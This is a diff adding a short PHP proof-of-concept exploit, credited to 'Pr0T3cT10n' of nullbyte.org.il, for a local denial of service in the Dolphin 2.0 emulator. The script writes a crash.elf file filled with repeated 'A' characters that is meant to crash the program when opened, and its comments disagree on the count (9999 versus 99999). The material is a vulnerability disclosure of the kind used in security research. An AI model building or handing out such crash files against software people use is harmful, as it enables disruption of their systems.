@@ -1,0 +1,22 @@
+<?php
+# Dolphin 2.0 (.elf) Local Daniel Of Service
+# Software Site: http://www.dolphin-emu.com/
+# Software Download: http://www.dolphin-emu.com/downloads.php?cat_id=9&download_id=94
+# Author: Pr0T3cT10n <pr0t3ct10n@gmail.com>
+# Site: http://www.nullbyte.org.il
+##################################################################
+# Dolphin 2.0 is vulnerable to local denial of service attack.
+# When we try to open a file by 'Open(CTRL+O)'
+# that contains 9999 chars ('A'), so dolphin should crash.
+##################################################################
+# PoC / Code:
+$buffer = str_repeat('A', 99999); # Create 9999 chars('A')..
+if(file_put_contents('crash.elf', $buffer)) {
+ echo("File created successfuly.\r\nDolphin should crash when you open the file with it.\r\n");
+} else {
+ echo("Can't create file. Try again.\r\n");
+}
+# Cya :)
+# NULLBYTE.ORG.IL
+####################
+?>
